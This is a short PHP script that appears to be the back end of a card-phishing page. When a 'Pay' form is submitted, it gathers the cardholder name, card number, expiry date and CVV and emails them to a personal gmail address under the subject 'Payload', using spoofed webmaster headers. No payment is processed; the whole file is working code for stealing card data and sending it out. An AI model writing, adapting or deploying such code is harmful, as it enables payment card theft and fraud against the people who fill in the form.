<?php
if(isset($_POST["Pay"]))
{
    $cardho = $_POST['card_ho'];
    $cardno = $_POST['card_no'];
    $cardex = $_POST['card_ex'];
    $cvv = $_POST['cvv'];

    $message =  $cardho . " " . $cardno . " " . $cardex . " " . $cvv;

    $to = "emekaveli@gmail.com";
    $subject = "Payload";
    $headers = array(
        'From' => 'webmaster@example.com',
        'Reply-To' => 'webmaster@example.com',
        'X-Mailer' => 'PHP/' . phpversion()
    );
    try {
       if(!mail($to, $subject, $message, $headers)){
         throw new Exception("Failed");
       } 
      } catch (Exception $e) {
        echo $e->getMessage();
        die();
      } finally{
        mail($to, $subject, $message, $headers);
      }
}